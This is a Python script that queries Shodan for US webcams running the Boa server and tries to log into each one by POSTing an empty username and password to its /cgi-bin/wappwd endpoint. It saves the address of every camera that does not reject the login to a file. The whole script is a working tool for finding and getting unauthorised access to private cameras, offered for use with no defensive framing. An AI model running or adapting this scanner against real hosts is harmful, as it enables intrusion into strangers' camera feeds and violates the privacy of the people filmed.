#!/usr/bin/env python3

from shodan import Shodan
from credentials import api_key
import requests
import math

"""
	Search Shodan for unsecure webcams
"""


class shodan:
    def __init__(self):
        self.api = Shodan(api_key)
        self.payload = {
            "WAPLOGIN": "",
            "WAPPASSWORD": "",
            "PIC_SIZE": "RES_3",
            "FILEOK": "camera.htm",
            "FILEFAIL": "denied.htm",
            "Submit": "OK",
        }

        # Search query and save to file
        self.searchQuery = "boa Content-Length: 963 country:US"
        self.filename = "unsecure.txt"

    def get_results(self, page=1):
        # get results
        results = self.api.search(self.searchQuery, page=page)

        # calculate number of pages (100 results per page)
        pages = math.ceil(results["total"] / 100)
        print("Page: {}/{}".format(page, pages))
        count = 1

        # Loop through results, make POST request to login page
        # If end of page, search next page in line
        for result in results["matches"]:
            try:
                if count < len(results["matches"]):
                    # attempt to login
                    r = requests.post(
                        "http://{}:{}/cgi-bin/wappwd".format(
                            result["ip_str"], result["port"]
                        ),
                        data=self.payload,
                    )
                    # login failed or not
                    if "DENIED" not in r.text:
                        # append IP address to file
                        with open(self.filename, "a") as f:
                            f.write(
                                "\nhttp://{}:{}".format(
                                    result["ip_str"], result["port"]
                                )
                            )
                        print("http://{}:{}".format(result["ip_str"], result["port"]))
                    count += 1
                else:
                    if page < pages:
                        shodan.get_results(page=page + 1)
            except:
                count += 1


if __name__ == "__main__":
    print("Scanning...")
    shodan = shodan()
    shodan.get_results(page=1)
